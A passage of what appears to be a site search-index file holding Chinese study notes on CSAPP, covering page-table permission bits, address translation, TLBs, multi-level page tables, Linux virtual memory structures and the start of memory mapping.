\u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u5185\u5b58\u4fdd\u62a4\u7684\u5de5\u5177","text":"<p>\u4efb\u4f55\u73b0\u4ee3\u8ba1\u7b97\u673a\u7cfb\u7edf\u5fc5\u987b\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u624b\u6bb5\u6765\u63a7\u5236\u5bf9\u5185\u5b58\u7cfb\u7edf\u7684\u8bbf\u95ee\uff1a</p> <ul> <li>\u4e0d\u5e94\u8be5\u5141\u8bb8\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u4fee\u6539\u5b83\u7684\u53ea\u8bfb\u4ee3\u7801\u6bb5\u3002</li> <li>\u4e0d\u5e94\u8be5\u5141\u8bb8\u5b83\u8bfb\u6216\u4fee\u6539\u4efb\u4f55\u5185\u6838\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u7ed3\u6784\u3002</li> <li>\u4e0d\u5e94\u8be5\u5141\u8bb8\u5b83\u8bfb\u6216\u8005\u5199\u5176\u4ed6\u8fdb\u7a0b\u7684\u79c1\u6709\u5185\u5b58</li> <li>\u4e0d\u5141\u8bb8\u5b83\u4fee\u6539\u4efb\u4f55\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u5171\u4eab\u7684\u865a\u62df\u9875\u9762\uff0c\u9664\u975e\u6240\u6709\u7684\u5171\u4eab\u8005\u90fd\u663e\u5f0f\u5730\u5141\u8bb8\u5b83\u8fd9\u4e48\u505a\uff08\u901a\u8fc7\u8c03\u7528\u660e\u786e\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7cfb\u7edf\u8c03\u7528\uff09\u3002</li> </ul> <p>\u63d0\u4f9b\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\u4f7f\u5f97\u533a\u5206\u4e0d\u540c\u8fdb\u7a0b\u7684\u79c1\u6709\u5185\u5b58\u53d8\u5f97\u5bb9\u6613\u3002\u4f46\u662f\uff0c\u5730\u5740\u7ffb\u8bd1\u673a\u5236\u53ef\u4ee5\u4ee5\u4e00\u79cd\u81ea\u7136\u7684\u65b9\u5f0f\u6269\u5c55\u5230\u63d0\u4f9b\u66f4\u597d\u7684\u8bbf\u95ee\u63a7\u5236\u3002\u56e0\u4e3a\u6bcf\u6b21 CPU \u751f\u6210\u4e00\u4e2a\u5730\u5740\u65f6\uff0c\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6\u90fd\u4f1a\u8bfb\u4e00\u4e2a PTE\uff0c\u6240\u4ee5\u901a\u8fc7\u5728 PTE \u4e0a\u6dfb\u52a0\u4e00\u4e9b\u989d\u5916\u7684\u8bb8\u53ef\u4f4d\u6765\u63a7\u5236\u5bf9\u4e00\u4e2a\u865a\u62df\u9875\u9762\u5185\u5bb9\u7684\u8bbf\u95ee\u5341\u5206\u7b80\u5355\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6bcf\u4e2a PTE \u4e2d\u5df2\u7ecf\u6dfb\u52a0\u4e86\u4e09\u4e2a\u8bb8\u53ef\u4f4d\u3002SUP \u4f4d\u8868\u793a\u8fdb\u7a0b\u662f\u5426\u5fc5\u987b\u8fd0\u884c\u5728\u5185\u6838\uff08\u8d85\u7ea7\u7528\u6237\uff09\u6a21\u5f0f\u4e0b\u624d\u80fd\u8bbf\u95ee\u8be5\u9875\u3002\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u4e2d\u7684\u8fdb\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u4efb\u4f55\u9875\u9762\uff0c\u4f46\u662f\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\u4e2d\u7684\u8fdb\u7a0b\u53ea\u5141\u8bb8\u8bbf\u95ee\u90a3\u4e9b SUP \u4e3a 0 \u7684\u9875\u9762\u3002READ \u4f4d\u548c WRITE \u4f4d\u63a7\u5236\u5bf9\u9875\u9762\u7684\u8bfb\u548c\u5199\u8bbf\u95ee\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8fdb\u7a0b i \u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\uff0c\u90a3\u4e48\u5b83\u6709\u8bfb VP 0 \u548c\u8bfb\u5199 VP 1 \u7684\u6743\u9650\u3002\u7136\u800c\uff0c\u4e0d\u5141\u8bb8\u5b83\u8bbf\u95ee VP 2\u3002</p> <p>\u5982\u679c\u4e00\u6761\u6307\u4ee4\u8fdd\u53cd\u4e86\u8fd9\u4e9b\u8bb8\u53ef\u6761\u4ef6\uff0c\u90a3\u4e48 CPU \u5c31\u89e6\u53d1\u4e00\u4e2a\u4e00\u822c\u4fdd\u62a4\u6545\u969c\uff0c\u5c06\u63a7\u5236\u4f20\u9012\u7ed9\u4e00\u4e2a\u5185\u6838\u4e2d\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002Linux shell \u4e00\u822c\u5c06\u8fd9\u79cd\u5f02\u5e38\u62a5\u544a\u4e3a\u201c\u6bb5\u9519\u8bef\uff08segmentation fault\uff09\u201d\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_24","title":"\u56db\u3001\u5730\u5740\u7ffb\u8bd1","text":"<p>\u5982\u56fe\u5c55\u793a\u4e86 MMU \u5982\u4f55\u5229\u7528\u9875\u8868\u6765\u5b9e\u73b0\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5143\u7d20\u548c\u7269\u7406\u7a7a\u95f4\u4e2d\u7684\u5143\u7d20\u7684\u6620\u5c04\u3002</p> <p>CPU \u4e2d\u7684\u4e00\u4e2a\u63a7\u5236\u5bc4\u5b58\u5668\uff0c\u9875\u8868\u57fa\u5740\u5bc4\u5b58\u5668\uff08Page Table Base Register\uff0cPTBR\uff09\u6307\u5411\u5f53\u524d\u9875\u8868\u3002</p> <p>n \u4f4d\u7684\u865a\u62df\u5730\u5740\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a\u4e00\u4e2a p \u4f4d\u7684 \u865a\u62df\u9875\u9762\u504f\u79fb\uff08Virtual Page Offset\uff0cVPO\uff09\u548c\u4e00\u4e2a n-p \u4f4d\u7684 \u865a\u62df\u9875\u53f7\uff08Virtual Page Number\uff0cVPN\uff09\u3002</p> <p>MMU \u5229\u7528 VPN \u6765\u9009\u62e9\u9002\u5f53\u7684 PTE\u3002\u4f8b\u5982\uff0cVPN 0 \u9009\u62e9 PTE 0\uff0cVPN 1 \u9009\u62e9 PTE 1\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5c06\u9875\u8868\u6761\u76ee\u4e2d \u7269\u7406\u9875\u53f7\uff08Physical Page Number\uff0cPPN\uff09\u548c\u865a\u62df\u5730\u5740\u4e2d\u7684 VPO \u4e32\u8054\u8d77\u6765\uff0c\u5c31\u5f97\u5230\u76f8\u5e94\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u6ce8\u610f\uff0c\u56e0\u4e3a\u7269\u7406\u548c\u865a\u62df\u9875\u9762\u90fd\u662f P \u5b57\u8282\u7684\uff0c\u6240\u4ee5 \u7269\u7406\u9875\u9762\u504f\u79fb\uff08Physical Page Offset\uff0cPPO\uff09\u548c VPO \u662f\u76f8\u540c\u7684\u3002</p> <p></p> <p>\u66f4\u8be6\u7ec6\u53c2\u8003 CSAPP 568\u3002</p> <p>\u7ed3\u5408\u9ad8\u901f\u7f13\u5b58\u548c\u865a\u62df\u5185\u5b58</p> <p>\u5c06\u9875\u8868\u6761\u76ee PTE \u5b58\u50a8\u5728\u9ad8\u901f\u7f13\u5b58 SRAM \u4e2d\u3002</p> <p>\u5229\u7528 TLB \u52a0\u901f\u5730\u5740\u7ffb\u8bd1</p> <p>\u6b63\u5982\u6211\u4eec\u770b\u5230\u7684\uff0c\u6bcf\u6b21 CPU \u4ea7\u751f\u4e00\u4e2a\u865a\u62df\u5730\u5740\uff0cMMU \u5c31\u5fc5\u987b\u67e5\u9605\u4e00\u4e2a PTE\uff0c\u4ee5\u4fbf\u5c06\u865a\u62df\u5730\u5740\u7ffb\u8bd1\u4e3a\u7269\u7406\u5730\u5740\u3002</p> <p>\u82e5\u7ed3\u5408\u4e86\u9ad8\u901f\u7f13\u5b58\uff0c\u90a3\u4e48\u5982\u679c PTE \u78b0\u5de7\u7f13\u5b58\u5728 SRAM \u4e2d\uff0c\u90a3\u4e48\u5f00\u9500\u5c31\u5f97\u5230\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0b\u964d\u3002</p> <p>\u4e3a\u4e86\u8fdb\u4e00\u6b65\u8282\u7ea6\u5f00\u9500\uff0c\u8bb8\u591a\u7cfb\u7edf\u5728 MMU \u4e2d\u5305\u62ec\u4e86\u4e00\u4e2a\u5173\u4e8e PTE \u7684\u5c0f\u7684\u7f13\u5b58\uff0c\u79f0\u4e3a \u5feb\u8868\uff08Translation Lookaside Buffer\uff0cTLB\uff09\u3002</p> <p>TLB \u662f\u4e00\u4e2a\u5c0f\u7684\u3001\u865a\u62df\u5bfb\u5740\u7684\u7f13\u5b58\uff0c\u5176\u4e2d\u6bcf\u4e00\u884c\u90fd\u4fdd\u5b58\u7740\u4e00\u4e2a\u7531\u5355\u4e2a PTE \u7ec4\u6210\u7684\u5757\u3002</p> <p>\u591a\u7ea7\u9875\u8868</p> <p>\u6211\u4eec\u4e00\u76f4\u5047\u8bbe\u7cfb\u7edf\u53ea\u7528\u4e00\u4e2a\u5355\u72ec\u7684\u9875\u8868\u6765\u8fdb\u884c\u5730\u5740\u7ffb\u8bd1\u3002\u4f46\u662f\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a 32 \u4f4d\u7684\u5730\u5740\u7a7a\u95f4\u30014KB \u7684\u9875\u9762\u548c\u4e00\u4e2a 4 \u5b57\u8282\u7684 PTE\uff0c\u90a3\u4e48\u5373\u4f7f\u5e94\u7528\u6240\u5f15\u7528\u7684\u53ea\u662f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u5f88\u5c0f\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u603b\u662f\u9700\u8981\u4e00\u4e2a 4MB \u7684\u9875\u8868\u9a7b\u7559\u5728\u5185\u5b58\u4e2d\u3002\u5bf9\u4e8e\u5730\u5740\u7a7a\u95f4\u4e3a 64 \u4f4d\u7684\u7cfb\u7edf\u6765\u8bf4\uff0c\u95ee\u9898\u5c06\u53d8\u5f97\u66f4\u590d\u6742\u3002</p> <p>\u7528\u6765 \u538b\u7f29\u9875\u8868 \u7684\u5e38\u7528\u65b9\u6cd5\u662f \u4f7f\u7528\u5c42\u6b21\u7ed3\u6784\u7684\u9875\u8868\u3002</p> <p>\u5047\u8bbe 32 \u4f4d\u865a\u62df\u5730\u5740\u7a7a\u95f4\u88ab\u5206\u4e3a 4KB \u7684\u9875\uff0c\u800c\u6bcf\u4e2a\u9875\u8868\u6761\u76ee\u90fd\u662f 4 \u5b57\u8282\u3002\u8fd8\u5047\u8bbe\u5728\u8fd9\u4e00\u65f6\u523b\uff0c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6709\u5982\u4e0b\u5f62\u5f0f\uff1a\u5185\u5b58\u7684\u524d 2K \u4e2a\u9875\u9762\u5206\u914d\u7ed9\u4e86\u4ee3\u7801\u548c\u6570\u636e\uff0c\u63a5\u4e0b\u6765\u7684 6K \u4e2a\u9875\u9762\u8fd8\u672a\u5206\u914d\uff0c\u518d\u63a5\u4e0b\u6765\u7684 1023 \u4e2a\u9875\u9762\u4e5f\u672a\u5206\u914d\uff0c\u63a5\u4e0b\u6765\u7684 1 \u4e2a\u9875\u9762\u5206\u914d\u7ed9\u4e86\u7528\u6237\u6808\u3002</p> <p>\u4e0b\u56fe\u5c55\u793a\u4e86\u6211\u4eec\u5982\u4f55\u4e3a\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6784\u9020\u4e00\u4e2a\u4e24\u7ea7\u7684\u9875\u8868\u5c42\u6b21\u7ed3\u6784\uff1a</p> <p></p> <p>\u4e00\u7ea7\u9875\u8868\u4e2d\u7684\u6bcf\u4e2a PTE \u8d1f\u8d23\u6620\u5c04\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4e00\u4e2a 4MB \u7684 \u7247\uff08chunk\uff09\uff0c\u8fd9\u91cc\u6bcf\u4e00\u7247\u90fd\u662f\u7531 1024 \u4e2a\u8fde\u7eed\u7684\u9875\u9762\u7ec4\u6210\u7684\u3002\u6bd4\u5982\uff0cPTE 0 \u6620\u5c04\u7b2c\u4e00\u7247\uff0cPTE 1 \u6620\u5c04\u63a5\u4e0b\u6765\u7684\u4e00\u7247\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5047\u8bbe\u5730\u5740\u7a7a\u95f4\u662f 4GB\uff0c1024 \u4e2a PTE \u5df2\u7ecf\u8db3\u591f\u8986\u76d6\u6574\u4e2a\u7a7a\u95f4\u4e86\u3002</p> <p>\u4e8c\u7ea7\u9875\u8868\u4e2d\u7684\u6bcf\u4e2a PTE \u90fd\u8d1f\u8d23\u6620\u5c04\u4e00\u4e2a 4KB \u7684\u865a\u62df\u5185\u5b58\u9875\u9762\uff0c\u5c31\u50cf\u6211\u4eec\u67e5\u770b\u53ea\u6709\u4e00\u7ea7\u7684\u9875\u8868\u4e00\u6837\u3002\u6ce8\u610f\uff0c\u4f7f\u7528 4 \u5b57\u8282\u7684 PTE\uff0c\u6bcf\u4e2a\u4e00\u7ea7\u548c\u4e8c\u7ea7\u9875\u8868\u90fd\u662f 4KB \u5b57\u8282\uff0c\u8fd9\u521a\u597d\u548c\u4e00\u4e2a\u9875\u9762\u7684\u5927\u5c0f\u662f\u4e00\u6837\u7684\u3002</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u4ece\u4e24\u4e2a\u65b9\u9762\u51cf\u5c11\u4e86\u5185\u5b58\u8981\u6c42\uff1a</p> <ul> <li>\u7b2c\u4e00\uff0c\u5982\u679c\u4e00\u7ea7\u9875\u8868\u4e2d\u7684\u4e00\u4e2a PTE \u662f\u7a7a\u7684\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u4e8c\u7ea7\u9875\u8868\u5c31\u6839\u672c\u4e0d\u4f1a\u5b58\u5728\u3002\u8fd9\u4ee3\u8868\u7740\u4e00\u79cd\u5de8\u5927\u7684\u6f5c\u5728\u8282\u7ea6\uff0c\u56e0\u4e3a\u5bf9\u4e8e\u4e00\u4e2a\u5178\u578b\u7684\u7a0b\u5e8f\uff0c4GB   \u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u5927\u90e8\u5206\u90fd\u4f1a\u662f\u672a\u5206\u914d\u7684\u3002</li> <li>\u7b2c\u4e8c\uff0c\u53ea\u6709\u4e00\u7ea7\u9875\u8868\u624d\u9700\u8981\u603b\u662f\u5728\u4e3b\u5b58\u4e2d\uff1b\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u521b\u5efa\u3001\u9875\u9762\u8c03\u5165\u6216\u8c03\u51fa\u4e8c\u7ea7\u9875\u8868\uff0c\u8fd9\u5c31\u51cf\u5c11\u4e86\u4e3b\u5b58\u7684\u538b\u529b\uff1b\u53ea\u6709\u6700\u7ecf\u5e38\u4f7f\u7528\u7684\u4e8c\u7ea7\u9875\u8868\u624d\u9700\u8981\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d\u3002</li> </ul> <p>\u7531\u4e8e\u66f4\u6539\u4e86\u9875\u8868\u7ed3\u6784\uff0c\u865a\u62df\u5730\u5740\u4e5f\u9700\u8981\u8fdb\u884c\u76f8\u5e94\u7684\u4fee\u6539\uff1a</p> <p></p> <p>VPN1 \u4ee3\u8868\u4e00\u7ea7\u9875\u8868\uff0c\u6bcf\u4e2a\u9ad8\u7ea7\u9875\u8868\u7684 PTE \u90fd\u6307\u5411\u5176\u5b50\u7ea7\u9875\u8868\u7684\u57fa\u5740\uff0cVPN k \u5219\u6307\u5411\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\uff08\u6216\u78c1\u76d8\u4e0a\u7684\u865a\u62df\u9875\u9762\u5730\u5740\uff09\u3002</p> <p>\u4e3a\u4e86\u6784\u9020\u7269\u7406\u5730\u5740\uff0c\u5728\u80fd\u591f\u786e\u5b9a PPN \u4e4b\u524d\uff0cMMU \u5fc5\u987b\u8bbf\u95ee k \u4e2a PTE\u3002</p> <p>\u8bbf\u95ee k \u4e2a PTE\uff0c\u7b2c\u4e00\u773c\u770b\u4e0a\u53bb\u6602\u8d35\u800c\u4e0d\u5207\u5b9e\u9645\u3002\u7136\u800c\uff0c\u8fd9\u91cc TLB \u80fd\u591f\u8d77\u4f5c\u7528\uff0c\u6b63\u662f\u901a\u8fc7\u5c06\u4e0d\u540c\u5c42\u6b21\u4e0a\u9875\u8868\u7684 PTE \u7f13\u5b58\u8d77\u6765\u3002\u5b9e\u9645\u4e0a\uff0c\u5e26\u591a\u7ea7\u9875\u8868\u7684\u5730\u5740\u7ffb\u8bd1\u5e76\u4e0d\u6bd4\u5355\u7ea7\u9875\u8868\u6162\u5f88\u591a\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#linux","title":"\u4e94\u3001Linux \u865a\u62df\u5185\u5b58\u7cfb\u7edf","text":"<p>\u672c\u7ae0\u5c06\u5bf9 Linux \u7684\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u505a\u4e00\u4e2a\u63cf\u8ff0\uff0c\u4f7f\u4f60\u80fd\u591f\u5927\u81f4\u4e86\u89e3\u4e00\u4e2a\u5b9e\u9645\u7684\u64cd\u4f5c\u7cfb\u7edf\u662f\u5982\u4f55\u7ec4\u7ec7\u865a\u62df\u5185\u5b58\uff0c\u4ee5\u53ca\u5982\u4f55\u5904\u7406\u7f3a\u9875\u7684\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0cLinux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff1a</p> <ul> <li>\u719f\u6089\u7684\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u3001\u5171\u4eab\u5e93\u4ee5\u53ca\u6808\u6bb5\u3002</li> <li>\u5185\u6838\u865a\u62df\u5185\u5b58\uff0c\u4f4d\u4e8e\u7528\u6237\u6808\u4e4b\u4e0a\u3002</li> </ul> <p></p> <p>\u5185\u6838\u865a\u62df\u5185\u5b58\u5305\u542b\u5185\u6838\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u7ed3\u6784\uff1a</p> <ul> <li> <p>\u67d0\u4e9b\u533a\u57df\u88ab\u6620\u5c04\u5230\u6240\u6709\u8fdb\u7a0b\u5171\u4eab\u7684\u7269\u7406\u9875\u9762\u3002\u4f8b\u5982\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5171\u4eab\u5185\u6838\u7684\u4ee3\u7801\u548c\u5168\u5c40\u6570\u636e\u7ed3\u6784\u3002</p> </li> <li> <p>\u5176\u4ed6\u533a\u57df\u5305\u542b\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4e0d\u76f8\u540c\u7684\u6570\u636e\u3002\u6bd4\u5982\u8bf4\uff0c\u9875\u8868\u3001\u5185\u6838\u5728\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4ee3\u7801\u65f6\u4f7f\u7528\u7684\u6808\uff0c\u4ee5\u53ca\u8bb0\u5f55\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5f53\u524d\u7ec4\u7ec7\u7684\u5404\u79cd\u6570\u636e\u7ed3\u6784\u3002</p> </li> </ul> <p>\u90a3\u865a\u62df\u5185\u5b58\u533a\u57df\u5230\u5e95\u6307\u4ec0\u4e48\uff1f</p> <p>Linux \u5c06\u865a\u62df\u5185\u5b58\u7ec4\u7ec7\u6210\u4e00\u4e9b\u533a\u57df\uff08\u4e5f\u53eb\u505a\u6bb5\uff09\u7684\u96c6\u5408\u3002\u4e00\u4e2a\u533a\u57df\uff08area\uff09\u5c31\u662f\u5df2\u7ecf\u5b58\u5728\u7740\u7684\uff08\u5df2\u5206\u914d\u7684\uff09\u865a\u62df\u5185\u5b58\u7684\u8fde\u7eed\u7247\uff08chunk\uff09\uff0c\u8fd9\u4e9b\u9875\u662f\u4ee5\u67d0\u79cd\u65b9\u5f0f\u76f8\u5173\u8054\u7684\u3002\u4f8b\u5982\uff0c\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u3001\u5806\u3001\u5171\u4eab\u5e93\u6bb5\uff0c\u4ee5\u53ca\u7528\u6237\u6808\u90fd\u662f\u4e0d\u540c\u7684\u533a\u57df\u3002</p> <p>\u6bcf\u4e2a\u5b58\u5728\u7684\u865a\u62df\u9875\u9762\u90fd\u4fdd\u5b58\u5728\u67d0\u4e2a\u533a\u57df\u4e2d\uff0c\u800c\u4e0d\u5c5e\u4e8e\u67d0\u4e2a\u533a\u57df\u7684\u865a\u62df\u9875\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u5e76\u4e14\u4e0d\u80fd\u88ab\u8fdb\u7a0b\u5f15\u7528\u3002</p> <p>\u533a\u57df\u7684\u6982\u5ff5\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6709\u95f4\u9699\u3002</p> <p>\u5185\u6838\u4e0d\u7528\u8bb0\u5f55\u90a3\u4e9b\u4e0d\u5b58\u5728\u7684\u865a\u62df\u9875\uff0c\u800c\u8fd9\u6837\u7684\u9875\u4e5f\u4e0d\u5360\u7528\u5185\u5b58\u3001\u78c1\u76d8\u6216\u8005\u5185\u6838\u672c\u8eab\u4e2d\u7684\u4efb\u4f55\u989d\u5916\u8d44\u6e90\u3002</p> <p>\u5185\u6838\u4e3a\u7cfb\u7edf\u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2a\u5355\u72ec\u7684\u4efb\u52a1\u7ed3\u6784\uff08\u6e90\u4ee3\u7801\u4e2d\u7684 task_struct\uff09\u3002\u4efb\u52a1\u7ed3\u6784\u4e2d\u7684\u5143\u7d20\u5305\u542b\u6216\u8005\u6307\u5411\u5185\u6838\u8fd0\u884c\u8be5\u8fdb\u7a0b\u6240\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f\uff08\u4f8b\u5982\uff0cPID\u3001\u6307\u5411\u7528\u6237\u6808\u7684\u6307\u9488\u3001\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u540d\u5b57\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u8ba1\u6570\u5668\uff09\u3002</p> <p></p> <p>\u4efb\u52a1\u7ed3\u6784\u4e2d\u7684\u4e00\u4e2a\u6761\u76ee\u6307\u5411 mm_struct\uff0c\u5b83\u63cf\u8ff0\u4e86\u865a\u62df\u5185\u5b58\u7684\u5f53\u524d\u72b6\u6001\u3002\u6211\u4eec\u611f\u5174\u8da3\u7684\u4e24\u4e2a\u5b57\u6bb5\u662f pgd \u548c mmap\uff0c\u5176\u4e2d pgd \u6307\u5411\u7b2c\u4e00\u7ea7\u9875\u8868\uff08\u9875\u5168\u5c40\u76ee\u5f55\uff09\u7684\u57fa\u5740\uff0c\u800c mmap \u6307\u5411\u4e00\u4e2a vm_area_structs\uff08\u533a\u57df\u7ed3\u6784\uff09\u7684\u94fe\u8868\uff0c\u5176\u4e2d\u6bcf\u4e2a vm_area_structs \u90fd\u63cf\u8ff0\u4e86\u5f53\u524d\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u4e2a\u533a\u57df\u3002\u5f53\u5185\u6838\u8fd0\u884c\u8fd9\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u5c31\u5c06 pgd \u5b58\u653e\u5728 CR3 \u63a7\u5236\u5bc4\u5b58\u5668\u4e2d\u3002</p> <p>\u4e3a\u4e86\u6211\u4eec\u7684\u76ee\u7684\uff0c\u4e00\u4e2a\u5177\u4f53\u533a\u57df\u7684\u533a\u57df\u7ed3\u6784\u5305\u542b\u4e0b\u9762\u7684\u5b57\u6bb5\uff1a</p> <ul> <li>vm_start\uff1a\u6307\u5411\u8fd9\u4e2a\u533a\u57df\u7684\u8d77\u59cb\u5904\u3002</li> <li>vm_end\uff1a\u6307\u5411\u8fd9\u4e2a\u533a\u57df\u7684\u7ed3\u675f\u5904\u3002</li> <li>vm_prot\uff1a\u63cf\u8ff0\u8fd9\u4e2a\u533a\u57df\u5185\u5305\u542b\u7684\u6240\u6709\u9875\u7684\u8bfb\u5199\u8bb8\u53ef\u6743\u9650\u3002</li> <li>vm_flags\uff1a\u63cf\u8ff0\u8fd9\u4e2a\u533a\u57df\u5185\u7684\u9875\u9762\u662f\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u5171\u4eab\u7684\uff0c\u8fd8\u662f\u8fd9\u4e2a\u8fdb\u7a0b\u79c1\u6709\u7684\uff08\u8fd8\u63cf\u8ff0\u4e86\u5176\u4ed6\u4e00\u4e9b\u4fe1\u606f\uff09\u3002</li> <li>vm_next\uff1a\u6307\u5411\u94fe\u8868\u4e2d\u4e0b\u2014\u533a\u57df\u7ed3\u6784\u3002</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_25","title":"\u516d\u3001\u5185\u5b58\u6620\u5c04","text":"<p>Linux \u901a\u8fc7\u5c06\u4e00\u4e2a\u865a\u62df\u5185\u5b58\u533a\u57df\u4e0e\u4e00\u4e2a\u78c1\u76d8\u4e0a\u7684 \u5bf9\u8c61\uff08object\uff09\u5173\u8054\u8d77\u6765\uff0c\u4ee5\u521d\u59cb\u5316\u8fd9\u4e2a\u865a\u62df\u5185\u5b58\u533a\u57df\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a \u5185\u5b58\u6620\u5c04\uff08memory mapping\uff09\uff0c\u865a\u62df\u5185\u5b58\u533a\u57df\u53ef\u4ee5\u6620\u5c04\u5230\u4e24\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\u4e2d\u7684\u4e00\u79cd\uff1a</p> <ol> <li>Linux \u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u666e\u901a\u6587\u4ef6\uff1a \u4e00\u4e2a\u533a\u57df\u53ef\u4ee5\u6620\u5c04\u5230\u4e00\u4e2a\u666e\u901a\u78c1\u76d8\u6587\u4ef6\u7684\u8fde\u7eed\u90e8\u5206    \uff0c\u4f8b\u5982\u4e00\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u3002\u6587\u4ef6\u533a\uff08section\uff09\u88ab\u5206\u6210\u9875\u5927\u5c0f\u7684\u7247\uff0c\u6bcf\u4e00\u7247\u5305\u542b\u4e00\u4e2a\u865a\u62df\u9875\u9762\u7684\u521d\u59cb\u5185\u5bb9\u3002\u56e0\u4e3a\u6309\u9700\u8fdb\u884c\u9875\u9762\u8c03\u5ea6\uff0c\u6240\u4ee5\u8fd9\u4e9b\u865a\u62df\u9875\u9762\u6ca1\u6709\u5b9e\u9645\u4ea4\u6362\u8fdb\u5165\u7269\u7406\u5185\u5b58\uff0c\u76f4\u5230    CPU \u7b2c\u4e00\u6b21\u5f15\u7528\u5230\u9875\u9762\uff08\u5373\u53d1\u5c04\u4e00\u4e2a\u865a\u62df\u5730\u5740\uff0c\u843d\u5728\u5730\u5740\u7a7a\u95f4\u8fd9\u4e2a\u9875\u9762\u7684\u8303\u56f4\u4e4b\u5185\uff09\u3002\u5982\u679c\u533a\u57df\u6bd4\u6587\u4ef6\u533a\u8981\u5927\uff0c\u90a3\u4e48\u5c31\u7528\u96f6\u6765\u586b\u5145\u8fd9\u4e2a\u533a\u57df\u7684\u4f59\u4e0b\u90e8\u5206\u3002</li> <li>\u533f\u540d\u6587\u4ef6\uff1a \u4e00\u4e2a\u533a\u57df\u4e5f\u53ef\u4ee5\u6620\u5c04\u5230\u4e00\u4e2a\u533f\u540d\u6587\u4ef6\uff0c\u533f\u540d\u6587\u4ef6\u662f\u7531\u5185\u6838\u521b\u5efa\u7684\uff0c\u5305\u542b\u7684\u5168\u662f\u4e8c\u8fdb\u5236\u96f6\u3002CPU    